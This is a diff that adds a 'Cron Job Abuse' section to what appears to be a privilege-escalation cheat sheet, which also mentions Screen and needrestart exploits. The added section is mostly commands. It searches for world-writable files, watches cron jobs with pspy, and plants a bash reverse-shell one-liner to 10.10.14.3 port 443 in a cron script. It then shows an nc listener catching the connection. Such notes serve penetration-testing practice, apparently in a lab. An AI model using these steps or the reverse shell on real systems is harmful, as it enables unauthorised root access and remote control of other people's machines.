@@ -99,6 +99,28 @@ Screen version 4.05.00 (GNU) 10-Dec-16
 Privilege Escalation - Screen_Exploit.sh
 
 ```
+##Cron Job Abuse
+```
+-- First, let's look around the system for any writeable files or directories
+
+ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+
+-- Let's run pspy and have a look at running corn job's
+
+./pspy64 -pf -i 1000
+
+-- Find the /bin/bash for the corn jon
+modify the script to add a Bash one-liner reverse shell
+
+bash -i >& /dev/tcp/10.10.14.3/443 0>&1
+
+nc -lnvp 443
+
+listening on [any] 443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
+ 
+```
+
 
 ##needrestart v3.7
 ```
